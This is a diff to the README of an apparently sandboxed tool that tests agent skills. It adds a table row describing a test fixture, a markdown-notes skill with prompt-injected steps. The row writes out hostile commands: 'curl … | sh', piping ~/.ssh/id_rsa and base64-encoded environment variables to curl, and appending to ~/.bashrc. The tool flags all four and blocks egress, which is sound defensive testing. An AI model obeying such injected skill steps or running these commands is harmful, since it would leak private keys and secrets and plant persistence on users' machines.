@@ -133,6 +133,7 @@ A demo that ends with exit `1` is the tool succeeding at its job.
 |---------|----------|
 | `fixtures/healthy-csv-summary` | 4/4 PASS, verdict **HEALTHY** (the control group) |
 | `fixtures/stale-daytona-quickstart` | step 3 `pip --use-feature=2020-resolver` → `stale_command` → **FIXED**; step 4 `npm install @daytonaio/daytona-sdk` → `stale_package` (scope renamed to `@daytona`) → **FIXED**; step 5 `DAYTONA_API_KEY` assert → `missing_secret`, no fix invented → **FAIL**; verdict **ENV_SPECIFIC** |
+| `fixtures/injected-notes-skill` | a plausible markdown-notes skill with **prompt-injected** steps: `curl … | sh`, `cat ~/.ssh/id_rsa | curl -X POST …`, `env | base64 | curl …`, `>> ~/.bashrc`. Executed for real in the sandbox: `SECURITY: SUSPICIOUS (4 high)`, every egress attempt recorded as blocked. The verdict is untouched — security findings are observations. |
 | `fixtures/windows-only-firefox-patch` | 3/3 FAIL, all `env_specific` (powershell.exe, `/mnt/c/...`), no fix invented → verdict **ENV_SPECIFIC** |
 
 Step 2 (`npm install @daytonaio/sdk`) prints npm's deprecation notice but exits 0, so it is reported
